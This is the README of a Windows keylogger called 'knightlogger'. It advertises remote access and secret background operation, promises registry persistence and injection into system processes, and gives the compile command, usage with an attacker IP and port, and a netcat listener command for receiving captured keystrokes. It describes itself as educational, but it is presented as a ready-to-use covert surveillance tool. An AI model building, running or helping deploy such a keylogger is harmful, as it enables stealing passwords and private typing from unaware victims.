# knightlogger
a basic stable keylogger written for eductional purpose works on windows platforms
notice this app is making high cpu usage
# options:
- remote access keylogger
- works in background secretly
 -> additional functions will be added soon like registery persistence and inject in system proccesses
# compile
`g++ -o knightlogger.exe knightlogger.cpp -lwsock32`
lwsock32 for telling g++ to link windows socket library

**easy to use**
`knightlogger.exe ipaddr portnumber`

you can listen for connection by many ways for example netcat way
`nc -lvp 4444`

**notice:** support only english main alphabet ascii characters and some other special keys but not all ,  i will add full support soon 

